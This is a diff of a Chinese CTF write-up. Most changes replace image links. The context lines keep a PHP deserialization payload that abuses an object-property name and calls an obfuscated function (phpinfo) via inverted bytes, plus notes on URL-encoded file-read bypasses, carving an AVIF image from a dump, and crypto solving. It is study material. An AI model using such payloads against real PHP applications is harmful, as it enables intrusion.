@@ -94,7 +94,7 @@ payload：
 #post
 root=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&pwd=";s:12:"%00push_it%00pwd";O:7:"pull_it":1:{s:10:"%00pull_it%00x";s:13:"(~%8F%97%8F%96%91%99%90)();";}
 ```
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1690340499079-c9370864-3199-493c-8c53-8b390c6ee534.png#averageHue=%23565555&clientId=u3e3c1aa7-c0c0-4&from=paste&height=599&id=ud8366cc9&originHeight=599&originWidth=1250&originalType=binary&ratio=1&rotation=0&showTitle=false&size=101919&status=done&style=none&taskId=ubf7f2d98-f261-4773-b7dd-e3b45af2baf&title=&width=1250)
+![image-20230805102533587](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051025777.png)
 ### hinder
 构造任意文件读取，url编码绕过
 ```php
@@ -133,16 +133,18 @@ public static void main(String[] args) throws Exception {
 base64解码
 ### foundme
 dmp文件，010editor查看，搜索flag
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689911385399-3f3aee34-fe46-42ef-a315-f2d96c936fe4.png#averageHue=%23393732&clientId=ufcee7a5e-b117-4&from=paste&height=773&id=u528c5b1e&originHeight=773&originWidth=1201&originalType=binary&ratio=1&rotation=0&showTitle=false&size=96741&status=done&style=none&taskId=u36b3ea46-c2af-4d0a-bb7b-f76738bde27&title=&width=1201)
+![image-20230805102544472](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051025685.png)
+
 ```javascript
 It's just a dump file, and you've found a new lead
 Maybe you know the Netflix picture format? Hope this hint helps you. Search for more information to find the flag!
 ```
 Netflix图片格式为avif，AVIF的文件头为00 00 00 XX 66 74 79 70
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689911968691-409638cd-1bb4-44b6-8a65-79a2bd6db252.png#averageHue=%23393732&clientId=ufcee7a5e-b117-4&from=paste&height=773&id=u374169f7&originHeight=773&originWidth=1239&originalType=binary&ratio=1&rotation=0&showTitle=false&size=99827&status=done&style=none&taskId=u3c298e43-a139-40dd-89a6-1b5b7294232&title=&width=1239)
+![image-20230805102601148](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051026334.png)
 从00 00 00 1C 66 74 79 70开始，舍弃后面的00，另保存为.avif
 查看图片
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689912867674-91d74b19-2d22-40ae-a0ac-cd47f4313679.png#averageHue=%23333736&clientId=ufcee7a5e-b117-4&from=paste&height=931&id=ufed65ca5&originHeight=931&originWidth=1200&originalType=binary&ratio=1&rotation=0&showTitle=false&size=613767&status=done&style=none&taskId=uc03628b4-20c2-451f-8cb4-f5722d4185a&title=&width=1200)
+![image-20230805102618213](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051026880.png)
+
 ## Crypto
 ### 数学但高中
 ```javascript
@@ -190,7 +192,8 @@ y=-x+55{51<x<52}
 函数画图
 [https://www.desmos.com/calculator?lang=zh-CN](https://www.desmos.com/calculator?lang=zh-CN)
 （括号复制不进去，手动输
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1690189144568-36b5fb35-c304-46db-bed4-5393d4d90522.png#averageHue=%23ededed&clientId=ucfe4549d-cdcc-4&from=paste&height=754&id=u4653b945&originHeight=754&originWidth=1264&originalType=binary&ratio=1&rotation=0&showTitle=false&size=95498&status=done&style=none&taskId=u4fe8f9dc-790d-4691-8b33-6a3a03706e8&title=&width=1264)
+![image-20230805102638880](https://raw.githubusercontent.com/githubmof/Img/main/img/202308051026373.png)
+
 ### Simple_encryption
 1.py
 ```javascript
